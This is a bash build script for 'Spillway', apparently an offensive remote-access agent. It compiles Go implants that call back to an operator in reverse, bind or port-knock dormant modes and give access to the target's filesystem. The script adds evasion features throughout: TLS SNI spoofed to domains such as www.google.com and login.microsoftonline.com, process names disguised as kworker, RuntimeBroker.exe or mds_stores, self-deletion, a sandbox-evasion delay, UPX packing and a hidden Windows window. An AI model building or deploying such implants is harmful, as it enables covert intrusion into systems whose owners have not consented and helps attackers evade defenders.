#!/usr/bin/env bash
set -euo pipefail

# Catppuccin Mocha
RED='\033[38;2;243;139;168m'
GREEN='\033[38;2;166;227;161m'
YELLOW='\033[38;2;249;226;175m'
BLUE='\033[38;2;137;180;250m'
MAUVE='\033[38;2;203;166;247m'
TEAL='\033[38;2;148;226;213m'
TEXT='\033[38;2;205;214;244m'
DIM='\033[38;2;147;153;178m'
BOLD='\033[1m'
RESET='\033[0m'

BINARY_NAME="spillway"
BUILD_DIR="bin"

SNI_POOL=(
    "www.google.com"
    "cdn.cloudflare.com"
    "api.github.com"
    "login.microsoftonline.com"
    "s3.amazonaws.com"
    "fonts.googleapis.com"
    "ajax.googleapis.com"
)

# ── helpers ────────────────────────────────────────────────────────────────────

info()    { echo -e "${BLUE}${BOLD}[*]${RESET} ${TEXT}$*${RESET}"; }
success() { echo -e "${GREEN}${BOLD}[+]${RESET} ${TEXT}$*${RESET}"; }
warn()    { echo -e "${YELLOW}${BOLD}[!]${RESET} ${TEXT}$*${RESET}"; }
error()   { echo -e "${RED}${BOLD}[-]${RESET} ${TEXT}$*${RESET}" >&2; exit 1; }
section() { echo -e "\n${MAUVE}${BOLD}── $* ${RESET}${DIM}$(printf '─%.0s' {1..40})${RESET}"; }

usage() {
    echo -e "${MAUVE}${BOLD}Spillway Agent Builder${RESET}"
    echo -e "${DIM}Usage:${RESET} ${TEXT}$0 <mode> <address> [options]${RESET}"
    echo
    echo -e "${TEAL}${BOLD}Modes:${RESET}"
    echo -e "  ${TEXT}reverse${RESET}  ${DIM}Agent calls back to listener${RESET}"
    echo -e "  ${TEXT}bind${RESET}     ${DIM}Agent listens, listener connects${RESET}"
    echo -e "  ${TEXT}dormant${RESET}  ${DIM}Agent waits for knock, then calls back${RESET}"
    echo
    echo -e "${TEAL}${BOLD}Address formats:${RESET}"
    echo -e "  ${DIM}IP:PORT         10.10.14.5:443${RESET}"
    echo -e "  ${DIM}IP PORT         10.10.14.5 443${RESET}"
    echo -e "  ${DIM}[IPv6]:PORT     [::1]:443${RESET}"
    echo
    echo -e "${TEAL}${BOLD}Options:${RESET}"
    echo -e "  ${BLUE}--key KEY${RESET}          Pre-shared key (base64) ${DIM}[auto-generated]${RESET}"
    echo -e "  ${BLUE}--sni HOST${RESET}         TLS SNI hostname ${DIM}[random from pool]${RESET}"
    echo -e "  ${BLUE}--root PATH${RESET}        Filesystem root on target ${DIM}[/]${RESET}"
    echo -e "  ${BLUE}--exclude PATHS${RESET}    Comma-separated exclude prefixes ${DIM}[OS defaults]${RESET}"
    echo -e "  ${BLUE}--procname NAME${RESET}    Process name masquerade ${DIM}[OS default]${RESET}"
    echo -e "  ${BLUE}--read-only${RESET}        Reject all write operations"
    echo -e "  ${BLUE}--self-delete${RESET}      Delete agent binary after start"
    echo -e "  ${BLUE}--rate-limit N${RESET}     Rate limit tokens/sec"
    echo -e "  ${BLUE}--rate-burst N${RESET}     Rate limit burst size"
    echo -e "  ${BLUE}--proxy ADDR${RESET}       HTTP proxy address"
    echo -e "  ${BLUE}--proxy-user USER${RESET}  Proxy username"
    echo -e "  ${BLUE}--proxy-pass PASS${RESET}  Proxy password"
    echo -e "  ${BLUE}--knock-port PORT${RESET}  UDP knock port (dormant mode) ${DIM}[49152]${RESET}"
    echo -e "  ${BLUE}--delay N${RESET}          Startup delay in seconds (sandbox evasion) ${DIM}[0]${RESET}"
    echo -e "  ${BLUE}--os OS${RESET}            Target OS: linux/windows/darwin ${DIM}[linux]${RESET}"
    echo -e "  ${BLUE}--arch ARCH${RESET}        Target arch: amd64/arm64 ${DIM}[amd64]${RESET}"
    echo -e "  ${BLUE}--all${RESET}              Build for all platforms"
    echo -e "  ${BLUE}--compress${RESET}         UPX compress binary"
    echo -e "  ${BLUE}--dry-run${RESET}          Show build command without executing"
    echo -e "  ${BLUE}--show-key${RESET}         Display PSK in build summary"
    echo
    echo -e "${TEAL}${BOLD}Examples:${RESET}"
    echo -e "  ${DIM}$0 reverse 10.10.14.5:443${RESET}"
    echo -e "  ${DIM}$0 bind 0.0.0.0:8443 --os windows --arch amd64${RESET}"
    echo -e "  ${DIM}$0 reverse 10.10.14.5 443 --all --compress${RESET}"
    echo -e "  ${DIM}$0 dormant 10.10.14.5:443 --knock-port 49152${RESET}"
    exit 0
}

parse_address() {
    local arg1="$1"
    local arg2="${2:-}"

    # [IPv6]:PORT
    if [[ "$arg1" =~ ^\[.*\]:[0-9]+$ ]]; then
        ADDR="$arg1"
        return 0
    fi

    # IP:PORT (IPv4 or hostname with colon)
    if [[ "$arg1" =~ ^[^:]+:[0-9]+$ ]]; then
        ADDR="$arg1"
        return 0
    fi

    # IP PORT (space separated) - consume next positional
    if [[ -n "$arg2" && "$arg2" =~ ^[0-9]+$ ]]; then
        ADDR="${arg1}:${arg2}"
        CONSUMED_EXTRA_ARG=1
        return 0
    fi

    error "Cannot parse address from: '$arg1' ${arg2:+(and '$arg2')}"
}

random_sni() {
    local idx=$(( RANDOM % ${#SNI_POOL[@]} ))
    echo "${SNI_POOL[$idx]}"
}

build_one() {
    local os="$1"
    local arch="$2"

    # OS-aware defaults
    local procname excludes
    case "$os" in
        linux)   procname="${OPT_PROCNAME:-[kworker/0:2]}"; excludes="${OPT_EXCLUDES:-/proc,/sys,/dev}" ;;
        windows) procname="${OPT_PROCNAME:-RuntimeBroker.exe}"; excludes="${OPT_EXCLUDES:-C:\\Windows\\Temp}" ;;
        darwin)  procname="${OPT_PROCNAME:-mds_stores}";     excludes="${OPT_EXCLUDES:-/System}" ;;
        *)       error "Unknown OS: $os" ;;
    esac

    # Output filename
    local ext=""
    [[ "$os" == "windows" ]] && ext=".exe"
    local output="${BUILD_DIR}/${BINARY_NAME}-agent-${os}-${arch}${ext}"

    # Build ldflags
    local ldflags="-s -w -buildid="
    [[ "$os" == "windows" ]] && ldflags+=" -H windowsgui"
    ldflags+=" -X main.cfgMode=${MODE}"
    ldflags+=" -X main.cfgAddress=${ADDR}"
    # NOTE: The PSK is embedded via -ldflags which appears in /proc/*/cmdline
    # on Linux. This is acceptable for build-time secrets (short-lived process)
    # but operators should be aware of the visibility window.
    ldflags+=" -X main.cfgPSK=${PSK}"
    ldflags+=" -X main.cfgFingerprint="
    ldflags+=" -X main.cfgSNI=${SNI}"
    ldflags+=" -X main.cfgRoot=${OPT_ROOT:-/}"
    ldflags+=" -X main.cfgExcludes=${excludes}"
    ldflags+=" -X main.cfgProcName=${procname}"
    ldflags+=" -X main.cfgReadOnly=${OPT_READ_ONLY:-false}"
    ldflags+=" -X main.cfgSelfDelete=${OPT_SELF_DELETE:-false}"
    ldflags+=" -X main.cfgRateLimit=${OPT_RATE_LIMIT:-}"
    ldflags+=" -X main.cfgRateBurst=${OPT_RATE_BURST:-}"
    ldflags+=" -X main.cfgProxyAddr=${OPT_PROXY:-}"
    ldflags+=" -X main.cfgProxyUser=${OPT_PROXY_USER:-}"
    ldflags+=" -X main.cfgProxyPass=${OPT_PROXY_PASS:-}"
    ldflags+=" -X main.cfgDelay=${OPT_DELAY:-0}"
    ldflags+=" -X main.cfgKnockPort=${OPT_KNOCK_PORT:-49152}"
    ldflags+=" -X main.cfgVersion=$(git describe --tags --always --dirty 2>/dev/null || echo dev)"
    ldflags+=" -X main.cfgBuildCommit=$(git rev-parse --short HEAD 2>/dev/null || echo unknown)"

    if [[ "${DRY_RUN}" == "1" ]]; then
        echo -e "${DIM}CGO_ENABLED=0 GOOS=${os} GOARCH=${arch} go build -tags agent -trimpath -ldflags \"${ldflags}\" -o ${output} ./cmd/spillway${RESET}"
        return 0
    fi

    info "Building ${os}/${arch} ..."
    CGO_ENABLED=0 GOOS="${os}" GOARCH="${arch}" go build -tags agent -trimpath -ldflags "${ldflags}" -o "${output}" ./cmd/spillway

    local size sha256
    size=$(du -sh "$output" 2>/dev/null | cut -f1)
    sha256=$(sha256sum "$output" 2>/dev/null | cut -d' ' -f1 || shasum -a 256 "$output" 2>/dev/null | cut -d' ' -f1)

    if [[ "${OPT_COMPRESS}" == "1" ]]; then
        if command -v upx &>/dev/null; then
            info "Compressing with UPX ..."
            upx --best "$output" >/dev/null 2>&1 || warn "UPX compression failed (skipping)"
            size=$(du -sh "$output" 2>/dev/null | cut -f1)
            sha256=$(sha256sum "$output" 2>/dev/null | cut -d' ' -f1 || shasum -a 256 "$output" 2>/dev/null | cut -d' ' -f1)
        else
            warn "UPX not found, skipping compression"
        fi
    fi

    local masked_psk="<hidden>"
    [[ "${SHOW_KEY}" == "1" ]] && masked_psk="$PSK"

    echo
    echo -e "  ${TEAL}Binary:${RESET}  ${TEXT}${output}${RESET}"
    echo -e "  ${TEAL}Size:${RESET}    ${TEXT}${size}${RESET}"
    echo -e "  ${TEAL}SHA256:${RESET}  ${DIM}${sha256}${RESET}"
    echo -e "  ${TEAL}OS/Arch:${RESET} ${TEXT}${os}/${arch}${RESET}"
    echo -e "  ${TEAL}Mode:${RESET}    ${TEXT}${MODE}${RESET}"
    echo -e "  ${TEAL}Address:${RESET} ${TEXT}${ADDR}${RESET}"
    echo -e "  ${TEAL}PSK:${RESET}     ${TEXT}${masked_psk}${RESET}"
    echo -e "  ${TEAL}SNI:${RESET}     ${TEXT}${SNI}${RESET}"
    if [[ "$MODE" == "dormant" ]]; then
        echo -e "  ${TEAL}Knock:${RESET}   ${TEXT}UDP/${OPT_KNOCK_PORT}${RESET}"
    fi

    success "Built ${output}"

    # Print listener/handler hint
    echo
    if [[ "$MODE" == "reverse" ]]; then
        echo -e "${MAUVE}${BOLD}Listener command:${RESET}"
        echo -e "  ${DIM}./bin/spillway listen --port ${ADDR##*:} --mount ./target --key ${masked_psk}${RESET}"
    elif [[ "$MODE" == "dormant" ]]; then
        echo -e "${MAUVE}${BOLD}Listener command:${RESET}"
        echo -e "  ${DIM}./bin/spillway listen --port ${ADDR##*:} --mount ./target --key ${masked_psk}${RESET}"
        echo
        echo -e "${MAUVE}${BOLD}Knock command:${RESET}"
        echo -e "  ${DIM}./bin/spillway knock <TARGET_IP> --port ${OPT_KNOCK_PORT} --key ${masked_psk}${RESET}"
    else
        echo -e "${MAUVE}${BOLD}Connect command:${RESET}"
        echo -e "  ${DIM}./bin/spillway connect ${ADDR} --mount ./target --key ${masked_psk}${RESET}"
    fi
}

# ── argument parsing ───────────────────────────────────────────────────────────

[[ $# -lt 1 ]] && usage
[[ "$1" == "-h" || "$1" == "--help" ]] && usage

MODE="$1"; shift

# Validate mode
[[ "$MODE" == "reverse" || "$MODE" == "bind" || "$MODE" == "dormant" ]] || error "Mode must be 'reverse', 'bind', or 'dormant', got: '$MODE'"

[[ $# -lt 1 ]] && error "Address required. Usage: $0 <mode> <address> [options]"

# Parse address (may consume 1 or 2 positional args)
CONSUMED_EXTRA_ARG=0
parse_address "$1" "${2:-}"
shift
[[ "$CONSUMED_EXTRA_ARG" == "1" && $# -ge 1 ]] && shift

# Defaults
OPT_KEY=""
OPT_SNI=""
OPT_ROOT="/"
OPT_EXCLUDES=""
OPT_PROCNAME=""
OPT_READ_ONLY="false"
OPT_SELF_DELETE="false"
OPT_RATE_LIMIT=""
OPT_RATE_BURST=""
OPT_PROXY=""
OPT_PROXY_USER=""
OPT_PROXY_PASS=""
OPT_DELAY="0"
OPT_KNOCK_PORT="49152"
OPT_OS="linux"
OPT_ARCH="amd64"
OPT_ALL=0
OPT_COMPRESS=0
DRY_RUN=0
SHOW_KEY=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        --key)         OPT_KEY="$2";        shift 2 ;;
        --sni)         OPT_SNI="$2";        shift 2 ;;
        --root)        OPT_ROOT="$2";       shift 2 ;;
        --exclude)     OPT_EXCLUDES="$2";   shift 2 ;;
        --procname)    OPT_PROCNAME="$2";   shift 2 ;;
        --read-only)   OPT_READ_ONLY="true";   shift ;;
        --self-delete) OPT_SELF_DELETE="true"; shift ;;
        --rate-limit)  OPT_RATE_LIMIT="$2"; shift 2 ;;
        --rate-burst)  OPT_RATE_BURST="$2"; shift 2 ;;
        --proxy)       OPT_PROXY="$2";      shift 2 ;;
        --proxy-user)  OPT_PROXY_USER="$2"; shift 2 ;;
        --proxy-pass)  OPT_PROXY_PASS="$2"; shift 2 ;;
        --knock-port)  OPT_KNOCK_PORT="$2"; [[ "$OPT_KNOCK_PORT" =~ ^[0-9]+$ ]] || error "--knock-port must be a positive integer"; shift 2 ;;
        --delay)       OPT_DELAY="$2"; [[ "$OPT_DELAY" =~ ^[0-9]+$ ]] || error "--delay must be a non-negative integer"; (( OPT_DELAY > 3600 )) && error "--delay max is 3600 (1 hour)"; shift 2 ;;
        --os)          OPT_OS="$2";         shift 2 ;;
        --arch)        OPT_ARCH="$2";       shift 2 ;;
        --all)         OPT_ALL=1;           shift ;;
        --compress)    OPT_COMPRESS=1;      shift ;;
        --dry-run)     DRY_RUN=1;           shift ;;
        --show-key)    SHOW_KEY=1;          shift ;;
        -h|--help)     usage ;;
        *) error "Unknown option: $1" ;;
    esac
done

# Validate OS/arch
case "$OPT_OS" in
    linux|windows|darwin) ;;
    *) error "OS must be linux, windows, or darwin" ;;
esac
case "$OPT_ARCH" in
    amd64|arm64) ;;
    *) error "Arch must be amd64 or arm64" ;;
esac

# Check go is installed
command -v go &>/dev/null || error "go is not installed or not in PATH"

# Generate PSK if not provided
if [[ -z "$OPT_KEY" ]]; then
    if command -v openssl &>/dev/null; then
        OPT_KEY=$(openssl rand -base64 32)
    else
        error "openssl not found; provide --key manually"
    fi
fi
PSK="$OPT_KEY"

# Select SNI
if [[ -z "$OPT_SNI" ]]; then
    SNI=$(random_sni)
else
    SNI="$OPT_SNI"
fi

# ── build ──────────────────────────────────────────────────────────────────────

section "Spillway Agent Build"

if [[ "$DRY_RUN" == "1" ]]; then
    warn "Dry run — no binaries will be built"
fi

mkdir -p "$BUILD_DIR"

if [[ "$OPT_ALL" == "1" ]]; then
    section "Building all platforms"
    build_one linux   amd64
    build_one linux   arm64
    build_one windows amd64
    build_one darwin  amd64
    build_one darwin  arm64
else
    build_one "$OPT_OS" "$OPT_ARCH"
fi

echo
success "Done."
